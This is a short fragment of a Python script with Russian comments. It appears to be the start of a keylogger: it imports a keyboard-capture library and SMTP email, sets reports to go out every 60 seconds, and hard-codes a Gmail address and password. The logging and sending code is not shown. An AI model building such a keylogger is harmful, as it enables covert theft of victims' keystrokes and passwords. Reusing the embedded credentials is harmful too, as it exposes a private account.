import keyboard
import smtplib #для отправки электронной почты по протоколу SMTP (gmail)
#Таймер для запуска через заданный «интервал» времени.
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 #время в секундах
EMAIL_ADDRESS = "bobik555852itd@gmail.com"
EMAIL_PASSWORD = "20Vladik07"